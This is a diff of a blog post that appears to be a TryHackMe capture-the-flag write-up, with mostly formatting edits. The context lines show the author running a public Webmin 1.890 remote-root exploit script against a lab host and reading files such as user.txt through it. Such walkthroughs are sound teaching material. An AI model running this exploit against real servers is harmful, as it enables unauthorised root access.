@@ -66,7 +66,7 @@ how to fix it, please visit the webpage mentioned above.
 
 And It's using self-signed certificates. I guess using browser is better from there.
 So I hop into my browser and go the path with https.
-(photo1)
+![Desktop View](/assets/img/2025-06-18-TryHackMe-Ninja_Skills/photo1.png){: width="972" height="589" }
 
 ## Trying to log in as a admin
 
@@ -111,25 +111,25 @@ And we got access with root.
 For user:
 
 ```bash
-❯ python fuck.py -host $IP -port 10000 -cmd "ls /home"          
+❯ python fuck.py -host $IP -port 10000 -cmd "ls /home"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
 ║║║├┤ ├┴┐│││││││
 ╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
-    
+
 			By: n0obit4
 			Github: https://github.com/n0obit4
 Your password has expired, and a new one must be chosen.
 dark
 
 
-~/dev/Python via  v3.13.3 (myenv) 
+~/dev/Python via  v3.13.3 (myenv)
 ❯ python fuck.py -host $IP -port 10000 -cmd "ls /home/dark"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
 ║║║├┤ ├┴┐│││││││
 ╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
-    
+
 			By: n0obit4
 			Github: https://github.com/n0obit4
 Your password has expired, and a new one must be chosen.
@@ -137,13 +137,13 @@ user.txt
 webmin_1.890_all.deb
 
 
-~/dev/Python via  v3.13.3 (myenv) 
+~/dev/Python via  v3.13.3 (myenv)
 ❯ python fuck.py -host $IP -port 10000 -cmd "cat /home/dark/user.txt"
 
 ╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
 ║║║├┤ ├┴┐│││││││
 ╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
-    
+
 			By: n0obit4
 			Github: https://github.com/n0obit4
 Your password has expired, and a new one must be chosen.
